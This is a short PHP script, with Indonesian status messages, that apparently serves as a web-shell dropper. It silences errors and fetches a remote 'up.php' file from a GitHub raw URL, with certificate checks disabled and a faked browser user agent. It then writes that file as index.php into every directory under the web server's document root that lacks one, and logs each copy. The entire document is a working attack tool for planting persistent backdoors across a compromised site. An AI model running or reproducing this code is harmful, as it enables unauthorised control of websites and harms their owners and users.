<?php
error_reporting(0);

$searchDir = $_SERVER['DOCUMENT_ROOT'];
$sourceUrl = "https://raw.githubusercontent.com/maw3six/maw3six/refs/heads/main/maw-gen/up.php";
$logFile = "copy_report.txt";

function fetchContent($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0");

    $data = curl_exec($ch);
    if (curl_errno($ch)) {
        curl_close($ch);
        return false;
    }
    curl_close($ch);
    return $data;
}

function copyToAllDirectories($dir, $url, $logFile) {
    if (!is_dir($dir)) {
        echo "[ERROR] Direktori tidak ditemukan: $dir\n";
        return;
    }

    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
    $logEntries = [];

    $content = fetchContent($url);
    if ($content === false || empty($content)) {
        echo "[ERROR] Gagal mengambil konten dari URL.\n";
        return;
    }

    foreach ($files as $file) {
        if ($file->isDir()) {
            $filePath = $file->getPathname() . "/index.php";

            if (file_exists($filePath)) {
                echo "[SKIPPED] $filePath sudah ada\n";
                $logEntries[] = "[SKIPPED] $filePath sudah ada";
                continue;
            }

            if (file_put_contents($filePath, $content) !== false) {
                echo "[COPIED] $filePath\n";
                $logEntries[] = "[COPIED] $filePath";
            } else {
                echo "[ERROR] Gagal menulis file di: $filePath\n";
                $logEntries[] = "[ERROR] Gagal menulis file di: $filePath";
            }
        }
    }

    if (!empty($logEntries)) {
        file_put_contents($logFile, implode("\n", $logEntries) . "\n", FILE_APPEND);
    }
}

copyToAllDirectories($searchDir, $sourceUrl, $logFile);
?>
